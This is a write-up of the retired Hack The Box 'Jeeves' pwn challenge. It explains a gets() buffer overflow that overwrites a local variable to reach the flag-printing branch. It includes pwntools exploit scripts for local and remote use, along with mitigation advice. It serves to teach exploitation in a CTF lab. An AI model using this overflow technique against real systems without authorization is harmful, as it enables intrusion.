---
challenge: Jeeves
type: Pwn
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, stack, dead-code, variable-overwrite, pwntools]
---

# Jeeves — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

The binary calls `gets` on a 60-byte buffer and compares a local variable with `0x1337bab3`. The comparison is never true, but the overflow overwrites the variable and reaches the code that reads and prints the flag. No return-address control is needed.

## Statement and surface

- Pwn, Easy, retired.
- A 64-bit binary and a remote instance are provided.
- The goal is to execute the branch that prints the flag.

```bash
file jeeves
checksec --file=jeeves
```

## Reconnaissance

- 64-bit ELF, not stripped.
- `gets` in `main` and a comparison against `0x1337bab3`.
- The true branch opens `flag.txt`, reads it and prints it.

```bash
nm jeeves | grep -E ' main|gets|open|read'
objdump -d -M intel jeeves | sed -n '/<main>:/,/^$/p'
```

## Code analysis

The binary declares a 60-byte buffer followed by a local variable initialized to `0xdeadc0d3`. `gets` does not limit the input. The later comparison checks whether the variable equals `0x1337bab3`; since the initial value differs, the branch is dead code.

```c
char buf[60];
int check = 0xdeadc0d3;
gets(buf);
if (check == 0x1337bab3) { /* read flag */ }
```

## Why it works

Writing 60 bytes fills the buffer; the next 4 bytes overwrite `check`. The comparison succeeds and the program runs the branch that opens the flag. PIE does not matter because no address is rewritten, only a stack value.

## Local reproduction

```bash
# Create a local flag.txt for testing.
printf 'HTB{<flag>}\n' > flag.txt
python3 - <<'PY'
from pwn import *
p = process('./jeeves')
p.sendline(b'A' * 60 + p64(0x1337bab3))
print(p.recvall().decode())
PY
```

## Exploitation

```python
from pwn import remote, p64

io = remote("<IP>", <PORT>)
io.sendline(b"A" * 60 + p64(0x1337bab3))
print(io.recvall().decode())
```

The output contains the flag; it is redacted. If the binary expects a newline, `sendline` adds it.

## Evidence

- Disassembly of the comparison.
- Payload and server response.
- Redacted flag.

## Lessons learned

- Not every overflow targets a shell: changing one variable can be enough.
- `gets` removes any length control.
- Stack layout and variable order determine the offset.

## Mitigations and detection

- Replace `gets` with `fgets` and build with canary, PIE and NX.
- Do not use local variables for security decisions.
- Validate input length on the server.
- Alert on repeated crashes and processes opening `flag.txt` after long input.

## References

- <https://www.hackthebox.com/challenges/Jeeves>
- <https://man7.org/linux/man-pages/man3/gets.3.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://github.com/Gallopsled/pwntools>
